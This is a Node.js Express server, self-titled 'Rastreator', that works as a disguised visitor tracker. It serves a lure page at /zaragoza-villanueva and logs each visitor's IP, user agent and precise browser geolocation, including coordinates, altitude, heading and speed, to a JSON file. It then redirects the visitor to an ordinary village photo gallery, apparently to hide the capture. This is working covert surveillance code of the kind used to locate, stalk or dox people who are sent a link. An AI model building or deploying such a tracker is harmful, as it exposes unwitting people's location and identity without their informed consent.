const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, 'data', 'visitors.json');
const REDIRECT_URL = 'https://verpueblos.com/aragon/zaragoza/zaragoza/galeria/18/';

// Ensure data directory exists
if (!fs.existsSync(path.join(__dirname, 'data'))) {
  fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
}
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
}

app.use(express.json());

// Helper to get real IP
function getClientIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) return forwarded.split(',')[0].trim();
  return req.connection?.remoteAddress || req.socket?.remoteAddress || req.ip || 'unknown';
}

// Serve the tracker page at /zaragoza-villanueva
app.get('/zaragoza-villanueva', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API endpoint to receive geolocation data and log it
app.post('/api/log', (req, res) => {
  try {
    const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed, denied } = req.body;
    const ip = getClientIP(req);
    const userAgent = req.headers['user-agent'] || 'unknown';
    const timestamp = new Date().toISOString();

    const entry = {
      id: Date.now(),
      timestamp,
      ip,
      userAgent,
      geolocation: denied
        ? { denied: true, reason: req.body.reason || 'User denied' }
        : {
            denied: false,
            latitude: latitude ?? null,
            longitude: longitude ?? null,
            accuracy: accuracy ?? null,
            altitude: altitude ?? null,
            altitudeAccuracy: altitudeAccuracy ?? null,
            heading: heading ?? null,
            speed: speed ?? null,
          },
    };

    // Read current log, append, and save
    const raw = fs.readFileSync(LOG_FILE, 'utf-8');
    const logs = JSON.parse(raw);
    logs.push(entry);
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

    console.log(`[${timestamp}] Visitor logged | IP: ${ip} | Geo: ${denied ? 'DENIED' : `${latitude}, ${longitude}`}`);

    res.json({ success: true, redirect: REDIRECT_URL });
  } catch (err) {
    console.error('Error logging visitor:', err);
    res.status(500).json({ success: false });
  }
});

// Root redirect for convenience
app.get('/', (req, res) => {
  res.redirect('/zaragoza-villanueva');
});

app.listen(PORT, () => {
  console.log(`🚀 Rastreator en línea → http://localhost:${PORT}/zaragoza-villanueva`);
});
